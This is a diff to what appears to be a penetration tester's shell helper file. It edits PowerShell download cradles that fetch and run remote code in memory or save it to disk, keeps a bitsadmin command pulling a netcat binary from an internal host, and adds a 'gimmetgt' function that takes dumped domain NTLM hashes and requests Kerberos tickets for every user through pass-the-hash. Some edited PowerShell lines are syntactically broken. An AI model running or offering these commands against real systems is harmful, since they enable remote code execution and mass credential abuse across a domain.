@@ -441,8 +441,8 @@ Get-Command -Module nishang
 Get-Help Get-ServiceDetail
 
 # Download
-echo "iex((New-a "x64" -object net.webclient).DownloadString(''))" #in memory
-echo "(new-a "x64" -object System.Net.WebClient).DownloadFile('<url>','C:\\Users\\Public\\<filename>'')" #ondisk
+iex((New-object net.webclient).DownloadString(''))" #in memory
+echo "(new-object System.Net.WebClient).DownloadFile('<url>','C:\\Users\\Public\\<filename>'')" #ondisk
 
 
 bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
@@ -495,7 +495,6 @@ function neo4jhere(){
         RED='\033[0;31m'
         NC='\033[0m' # No Color
         if [ $# -eq 1 ];then
-                NEO4J_USER="neo4j"
                 PROJECT_NAME=$1
                 echo -n "Password: "
                 read -s PASS
@@ -508,6 +507,27 @@ function neo4jhere(){
                 echo "The docker container is running under the name neo4j_$PROJECT_NAME"
         else
                 echo -e "${RED}Please enter a project name as argument ... neo4jhere <PROJECT_NAME>${NC}"
+        fi
+}
+
+echo "gimmetgt - Gets a tgt for every user in a secretsdump file - gimmetgt <DOMAIN_NAME> <PATH_SECRETSDUMPFILE>" #this is just a for fun and profit function... not good for opsec :)
+function gimmetgt(){
+        RED='\033[0;31m'
+        NC='\033[0m' # No Color
+        if [ $# -eq 2 ];then
+                DOMAIN_NAME=$1
+                PATH_SECRETSDUMPFILE=$2
+                i=1
+                cat $PATH_SECRETSDUMPFILE |  grep ":::" --color=NEVER | grep "$DOMAIN_NAME" --color=NEVER | cut -d":" -f1,4 | cut -d "\\" -f2 | while read line 
+                do
+                        USER_NAME=$(echo "$line" | cut -d":" -f1)
+                        USER_HASH=$(echo "$line" | cut -d":" -f2)
+                        echo "Tickets are incoming ..."
+                        proxychains impacket-getTGT $DOMAIN_NAME/$USER_NAME -hashes :$USER_HASH
+                done
+                
+        else
+                echo -e "${RED}Please enter a secretsdump output as argument ... gimmetgt <DOMAIN_NAME> <PATH_SECRETSDUMPFILE>${NC}"
         fi
 }
 
